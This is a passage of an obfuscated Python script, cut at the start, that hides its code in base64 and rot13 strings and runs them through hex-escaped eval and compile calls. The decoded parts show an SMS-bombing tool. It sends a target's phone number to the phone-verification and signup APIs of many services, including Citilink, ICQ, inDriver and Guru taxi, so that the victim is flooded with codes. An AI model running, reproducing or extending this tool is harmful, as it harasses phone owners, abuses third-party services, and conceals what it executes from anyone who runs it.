0ZXJQaG9uZSgkcGhvbmU6IFN0cmluZyEpIHtcbiAgZW50ZXJQaG9uZShwaG9uZTogJHBob25lKVxufVxuIn0pCgkJcHJpbnQoJ1srXSBjYXJzbWlsZSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBjYXJzbWlsZSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuY2l0aWxpbmsucnUvcmVnaXN0cmF0aW9uL2NvbmZpcm0vcGhvbmUvKycgKyBfcGhvbmUgKyAnLycpCgkJcHJpbnQoJ1srXSBDaXRpbGluayBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBDaXRpbGluayBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGkuZGVsaXRpbWUucnUvYXBpL3YyL3NpZ251cCIsZGF0YT17IlNpZ251cEZvcm1bdXNlcm5hbWVdIjogX3Bob25lLCAiU2lnbnVwRm9ybVtkZXZpY2VfdHlwZV0iOiAzfSkKCQlwcmludCgnWytdIERlbGl0aW1lIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIERlbGl0aW1lIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZmluZGNsb25lLnJ1L3JlZ2lzdGVyJywgcGFyYW1zPXsncGhvbmUnOiAnKycgKyBfcGhvbmV9KQoJCXByaW50KCdbK10gZmluZGNsb25lIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIGZpbmRjbG9uZSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ndXJ1LnRheGkvYXBpL3YxL2RyaXZlci9zZXNzaW9uL3ZlcmlmeSIsanNvbj17InBob25lIjogeyJjb2RlIjogMSwgIm51bWJlciI6IF9waG9uZX19KQoJCXByaW50KCdbK10gR3VydSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBHdXJ1IFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5pY3EuY29tL3Ntc3JlZy9yZXF1ZXN0UGhvbmVWYWxpZGF0aW9uLnBocCcsZGF0YT17J21zaXNkbic6IF9waG9uZSwgImxvY2FsZSI6ICdlbicsICdjb3VudHJ5Q29kZSc6ICdydScsJ3ZlcnNpb24nOiAnMScsICJrIjogImljMXJ0d3oxczFIajFPMHIiLCAiciI6ICI0Njc2MyJ9KQoJCXByaW50KCdbK10gSUNRIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIElDUSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly90ZXJyYS0xLmluZHJpdmVyYXBwLmNvbS9hcGkvYXV0aG9yaXphdGlvbj9sb2NhbGU9cnUiLGRhdGE9eyJtb2RlIjogInJlcXVlc3QiLCAicGhvbmUiOiAiKyIgKyBfcGhvbmUsInBo'
destiny = 'o25yK3Oypz1cp3Aco24vBvNvqJ5eoz93ovVfVPWmqUWyLJ1snJDvBvNjYPNvqvV6VQZfVPWupUO2MKWmnJ9hVwbtVwZhZwNhAvVfVz9mqzIlp2yiovV6VPW1ozgho3qhVvjtVzEyqzywMJ1iMTIfVwbtVaIhn25iq24vsFxXPDyjpzyhqPtaJlgqVRyhEUWcqzIlVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVRyhEUWcqzIlVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPWbqUEjpmbiY2keYzyhqzy0pz8hpaHip3NioJ9vnJkyDKOcY2AlMJS0MIImMKWPrIOup3A3o3WxVvjtMTS0LG17VaOup3A3o3WxVwbtpTSmp3qipzDfVPWupUOfnJAuqTyiovV6VPWfn3NvYPNvoT9anJ4vBvNvXlVtXlOspTuiozI9XDbWPKOlnJ50XPqoX10tFJ52nKElolOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOWoaMcqUWiVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY3IvMF5joKAgYz9lMl5lqF9yp2VinKSipl1jnT9hMF92LJkcMTS0MFpfnaAiow17VaObo25yVwbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVSOgp20tHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tHT1moFOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtvnUE0pUZ6Yl9upTxhnKMcYaW1Y21iLzyfMJSjnF91p2IlY3WyM2ymqTIlY3Obo25yY3L2VvkxLKEuCKfvpTuiozHvBvOspTuiozI9XDbWPKOlnJ50XPqoX10tFIMWVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVRyJFFOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9fMJ50LF5wo20iLKOcY3LkY2S1qTuyoaEcL2S0nJ9hY3WypKIyp3EJLJkcMTS0nJ9hD29xMFpfnaAiow17W3Obo25yWmbtWlfaVPftp2IfMv5zo3WgLKE0MJEspTuiozI9XDbWPKOlnJ50XPqoX10tGTIhqTRtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tGTIhqTRtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iL2kiqJDhoJScoP5lqF9upTxiqwVioz90nJM5Y2SjpTkcozfaYTcmo249rlWjnT9hMFV6VPVeVvNeVS9jnT9hMFjtVzSjnFV6VQVfVPWyoJScoPV6VPWyoJScoPVfVatgMJ1unJjvBvNvrP1yoJScoPW9XDbWPKOlnJ50XPqoX10tGJScoP5lqFOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOALJyfYaW1VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY3q3ql5gqzyxMJ8hpaHinJ50MKWhLJjgpzImqP1upTxiL29goJ9hY2S0Ml9lMKA0Y2SwqT9lpl9JMKWcMzywLKEco25OL3Eipv9aMKEQo2EyWlkjLKWuoKZ9rlWjLJqyGzSgMFV6VPWlMJqcp3EypyOlnKMuqTIIp2IlHTuiozIJMKWcMzywLKEcolW9YTEuqTR9rlWjnT9hMFV6VS9jnT9hMFjtVaWyL2SjqTAbLFV6VPqiMzLaYPNvMl1lMJAupUEwnTRgpzImpT9hp2HvBvNvVa0cPtxWpUWcoaDbW1feKFOAIzyxMJ8tHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tGIMcMTIiVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPWbqUEjpmbiY29eYaW1Y2EeC2AgMQ1Ooz9hrJ1FMJqcp3ElLKEco25SoaEypyObo25yWaA0YzAgMQ1uoz9hrJ1FMJqcp3ElLKEco25SoaEypyObo25yVvkxLKEuCKfvp3Dhpv5jnT9hMFV6VPVeVvNeVS9jnT9hMK0cPtxWpUWcoaDbW1feKFOCFlOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOCFlOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9joTyhnl50MJAbY3WyM2ymqTIlYlpfnaAiow17VaObo25yVwbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVSOfnJ5eVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVSOfnJ5eVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPWbqUEjpmbiY3SfMJShYaW1Y2AfnJIhqUZgLKOcY3LlY3Agp19wo2Eypl9uqKEbY3WypKIyp3EsL29xMFVfnaAiow17VaObo25yVwbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVUSfMJShVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVUSfMJShVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPWbqUEjBv8ip21mM29lo2DhpaHip2IhMUAgpl5jnUNvYTEuqTR9rlWhqJ1vMKVvBvOspTuiozI9XDbWPKOlnJ50XPqoX10tH01GM29lo2DtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tH01GM29lo2DtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iLKOcYzqiqTyhMTIlYzAioF92Zv9uqKEbY3Agpl9mMJ5xC2S1qTusqUyjMG1moKZzoT9wLJkyCKW1WlkxLKEuCKfapTuiozIsoaIgLzIlWmbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVSEcozEypvOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOHnJ5xMKVtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8ipTSmp3OipaDhqUqcqTAbYaE2Y3WyM2ymqTIlC3ElqKA0MJEspzIkqJImqQ10paIyWlkdp29hCKfvLzylqTuxLKxvBvO7VzEurFV6VQRkYPNvoJ9hqTtvBvNkZFjtVayyLKVvBvNkBGx5sFjvL2kcMJ50K2yxVwbtVzgxZKIhLwEvZ3R0qQH4MaqfpTAvrzAvoz03AzR4MaNvYPNvnJ5woUIxMI92MKWcMzywLKEco25sL29xMFV6VSElqJHfVaOup3A3o3WxVwbtpTSmp3qipzDfVPWjnT9hMI9hqJ1vMKVvBvOspTuiozHfVaImMKWhLJ1yVwbtqKAypz5uoJI9XDbWPKOlnJ50XPqoX10tIUqcqTAbVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVSE3nKEwnPOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9wLJWcozI0YaqcYJMcYaW1Y2SjnF9uqKEbY2W5YKAgplpfVTEuqTR9rlqgp2ymMT4aBvOspTuiozI9YTuyLJEypaZ9rlqOpUNgFHDaBvNaL2SvnJ5yqPq9XDbWPKOlnJ50XPqoX10tD2SvI2yTnFOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOQLJWKnHMcVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPWbqUEjpmbiY2SjnF53o3q3o3Wepl5lqF92Zv9mnKEyY3AyozDgL29xMFVfnaAiow17VaObo25yVwbtK3Obo25yYPNvqUyjMFV6VQW9XDbWPKOlnJ50XPqoX10tq293q29ln3ZtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tq293q29ln3ZtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iMJEuYayuozEyrP9upTxiqwRiqKAypv9lMKS1MKA0K2S1qTuyoaEcL2S0nJ9hK2AiMTHaYTcmo249rlWjnT9hMI9hqJ1vMKVvBvNvXlVtXlOspTuiozI9XDbWPKOlnJ50XPqoX10tEJEuYyyuozEyrPOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOSMTRhJJShMTI4VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY3yiqJkuYaW1Y3qyLv1upTxiLKI0nP9lMKS1MKA0K2AiMTHaYPOxLKEuCKfapTuiozHaBvOspTuiozI9XDbWPKOlnJ50XPqoX10tJJ91oTRtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tJJ91oTRtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iLJkjLKWcYzAioF9upTxipaHipUWiqTIwqTyiov9xMJkcqzIlYmWzZGp4LwR3BGxjL2R0Lwp5ZQAuLGtmATV5MwH0LmWwZTWwLwNkLGViWlkdp29hCKfvL2kcMJ50K3E5pTHvBvNvpTIlp29hLJjvYPNvMJ1unJjvBvOzVagyoJScoU1NM21unJjhpaHvYPWgo2WcoTIspTuiozHvBvOspTuiozHfVPWxMJkcqzIlrH9jqTyiovV6VPWmoKZvsFxXPDyjpzyhqPtaJlgqVRSfpTSlnFOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOOoUOupzxtHzIkqJImqUZtEzScoTIxVFpcPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl93q3phMTIfnKMypaxgL2k1Lv5lqF9unzS4Y3ImMKWso3EjWljtMTS0LG17VaObo25yVwbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVREyoTy2MKW5VSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVREyoTy2MKW5VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDycqTIlLKEco24tXm0tZDbWPKOlnJ50XPptCFO7sJAioKOfMKEyMPO0o3IlplNaYzMipz1uqPucqTIlLKEco24cXFNXPJI4L2IjqQbXPDyvpzIunjb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))